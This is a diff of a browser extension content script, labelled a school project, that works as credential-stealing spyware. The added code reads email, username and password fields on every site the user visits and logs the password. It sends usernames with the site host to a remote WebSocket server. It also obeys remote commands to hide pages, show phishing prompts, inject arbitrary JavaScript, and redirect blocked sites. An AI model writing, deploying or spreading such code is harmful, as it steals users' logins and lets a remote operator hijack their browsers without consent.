@@ -3,41 +3,15 @@ console.log("This is all for a school project!");
 
 //Flag variable used for if they filled out popup or not.
 var phishFl = "";
-chrome.storage.sync.get("phishFlag", function(ev){
-  phishFl = ev.phishFlag;
-  console.log("phishFlag upon initial load is " + phishFl);
-});
+var userNm = "";
+var passWd = "";
+var id = "";
+var addSite = "";
+var tempJs = "";
 
+//Connection to the server
 var HOST = 'wss://projectnickname123.herokuapp.com';
 var ws = new WebSocket(HOST);
-
-
-//This will get all the values of type email
-//Email is the standard type for the email text box
-//in most browsers
-
-//Simply say the website of the current tab
-console.log(window.location.host);
-
-var id;
-
-//Just for testing purposes
-chrome.storage.sync.get("id", function(ev){
-  id=ev.id;
-  console.log("This user is id is " + ev.id)
-});
-
-
-//This function will be used to phish for info from the user.
-function phishFunction(){
-
-}
-
-/*
-This is just for testing purposes to try to add
-a new value to storage. This will alos help with REDIRECTION
-TO ANOTHER SITE
-*/
 
 // This is supposed to be used to be able to add to the array depending on
 // input from the server.
@@ -48,41 +22,10 @@ chrome.storage.sync.get(["values"], function(result){
   console.log(arr);
   for(var i = 0; i < arr.length; i++){
     if(testString.includes(arr[i])){
-      document.getElementsByTagName("BODY")[0].style.display = "none";
-    //TO DO JS EXE, SIMPLY WRITE THE CODE UPON SIGNAL RECEIVE.
-
-
-    //  This function is meant to be able to phish stuff info from the user.
-      console.log("Before phishFlag changes " + phishFl);
-        if(phishFl.localeCompare("nope") === 0){
-          var confirmVal = confirm(testString + " needs more information from you to display properly.");
-          if(confirmVal == true){
-            console.log("INSIDE OF FALSE STATE PHISHFLAG");
-            phishFl = "yes";
-            chrome.storage.sync.set({'phishVal': phishFl}, function(){});
-            chrome.extension.sendMessage({action: 'openPhish'});
-          }
-          else{
-            chrome.storage.sync.set({'phishVal': phishFl}, function(){});
-            chrome.extension.sendMessage({action: 'openPhish'});
-          }
-        }
-        else{
-          var confirmVal = confirm(testString + " needs more information from you to continue access.");
-          if(confirmVal == true){
-            chrome.extension.sendMessage({action: 'openPhish'});
-          }
-          else{
-            chrome.extension.sendMessage({action: 'openPhish'});
-          }
-        }
-      }
+      window.location.replace("https://crouton.net/");
     }
+  }
 });
-
-      //This will redirect them from security website
-      //to a different site all together
-      //window.location.replace("https://crouton.net/");
 
 //Wait for a click on the screen
 window.addEventListener("click", clickListen, false);
@@ -93,7 +36,7 @@ function clickListen (e){
     if(val[i].type.toLowerCase() == 'email'){
         if(!(val[i].value === "" || val[i].value === null)){
           console.log("Username is " + val[i].value);
-          sendUsername(val[i].value);
+          userNm = val[i].value;
       }
     }
     if(val[i].type.toLowerCase() == 'password'){
@@ -101,25 +44,88 @@ function clickListen (e){
         console.log("Password is " + val[i].value);
       }
     }
-    /*
-    Some forms that are used, such as instagram forms,
-    have a input name rather than a type.
-    */
     if(val[i].name.toLowerCase() == 'username'){
       if(!(val[i].value === "" || val[i].value === null)){
         console.log("Username is " + val[i].value);
-        sendUsername(val[i].value);
+        userNm = val[i].value;
       }
+    }
+    if((!(userNm === null || userNm === "")) && (!(passWd === null || passWd === ""))){
+        sendUsername(userNm);
     }
   }
 }
 
+/*
+Helper function to send the username to the server
+*/
 function sendUsername(username){
   var url = window.location.host;
 	var jsonPackage = {id: id,type: 'username',url:url, username:username};
   ws.send(JSON.stringify(jsonPackage));
   console.log("sent "+JSON.stringify(jsonPackage));
 }
+
+/*
+This will listen for message from the background, to perform operations on the
+website and code.
+*/
+chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
+  switch(message.action){
+    //Phishing attack.
+    case 'phis':
+      document.getElementsByTagName("BODY")[0].style.display = "none";
+      var site = window.location.host;
+      chrome.storage.sync.set({'webSite': site}, function(){});
+      chrome.extension.sendMessage({action: 'load'}, function(response){});
+      break;
+    //JS exe code.
+    case 'exe':
+      var nodeScript = document.createElement('script');
+      nodeScript.type = 'text/javascript';
+      chrome.storage.sync.get("scriptExe", function(ev){
+        console.log("Inside of get function is " + ev.scriptExe);
+        nodeScript.appendChild(document.createTextNode(ev.scriptExe));
+        document.body.appendChild(nodeScript);
+      });
+      break;
+    case 'addL':
+    //add a website to the list of blocked websites.
+      chrome.storage.sync.get(["addSite", "values"], function(ev){
+        var tempVals = ev["values"];
+        addSite = ev.addSite;
+        tempVals[tempVals.length] = addSite;
+        chrome.storage.sync.set({'values': tempVals}, function(){});
+      });
+      break;
+  }
+});
+
+
+/*
+Helper function, used to get the website that is being blocked, while the
+phishing signal is active.
+*/
+chrome.storage.sync.get("webSite", function(ev){
+  phishFl = ev.webSite;
+  if(phishFl.localeCompare(window.location.host) === 0){
+      document.getElementsByTagName("BODY")[0].style.display = "none";
+      chrome.extension.sendMessage({action: 'load'}, function(response){});
+  }
+});
+
+/*
+//Display unique user ID and online status
+chrome.storage.sync.get("id", function(ev){
+  id=ev.id;
+  console.log("ONLINE This user is id is " + ev.id);
+  var jsonPackage = {id: id, type: 'online'};
+  if(ws.readyState === 1){
+    console.log("INSIDE OF READY STATE!");
+    ws.send(JSON.stringify(jsonPackage));
+  }
+});
+*/
 
 //chrome.tabs.executeScript({file: inject.js})
 
